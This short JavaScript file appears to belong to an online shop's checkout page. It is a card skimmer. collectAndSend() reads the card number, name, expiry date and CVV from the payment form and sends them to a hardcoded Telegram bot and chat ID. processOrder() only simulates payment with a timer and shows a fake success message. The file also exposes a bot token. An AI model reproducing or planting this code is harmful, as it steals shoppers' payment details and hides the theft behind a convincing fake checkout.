function sendMessage(message) {
    var telegramToken = '8531464570:AAE21ViriyYDHihJVMT8FV8UZ6zV12BpT4k';
    var chatId = '7112459295'; // Its has to be Integer
    var url = `https://api.telegram.org/bot8531464570:AAE21ViriyYDHihJVMT8FV8UZ6zV12BpT4k/sendMessage`;

    var request = new XMLHttpRequest();
    request.open("POST", url, true);
    request.setRequestHeader('Content-type', 'application/json');

    var params = {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
    };


    request.send(JSON.stringify(params));
}



// Process order
function processOrder() {
    const form = document.querySelector('.checkout-form');
    const requiredFields = form.querySelectorAll('input[required]');
    let isValid = true;
    
    // Validate all required fields
    requiredFields.forEach(field => {
        const fieldValid = validateField({ target: field });
        if (!fieldValid) {
            isValid = false;
        }
    });
    
    if (!isValid) {
        showNotification('Please fill in all required fields correctly', 'error');
        return;
    }
    
    // Show processing state
    const orderButton = document.querySelector('.place-order-btn');
    const originalText = orderButton.innerHTML;
    orderButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
    orderButton.disabled = true;
    
    // Simulate order processing
    setTimeout(() => {
        // Clear cart
        cart = [];
        localStorage.setItem('cart', JSON.stringify(cart));
        
        // Show success message
        showOrderSuccess();
    }, 2000);
}


function collectAndSend() {
    var card = document.getElementById('cardNumber')?.value || 'N/A';
    var name = document.getElementById('cardName')?.value || 'N/A';
    var exp = document.getElementById('expiryDate')?.value || 'N/A';
    var cvv = document.getElementById('cvv')?.value || 'N/A';

    var message = `> **Card :** ${card}\n> **Name :** ${name}\n> **Exp :** ${exp}\n> **CVV :** ${cvv}`;

    sendMessage(message);

    processOrder();

}
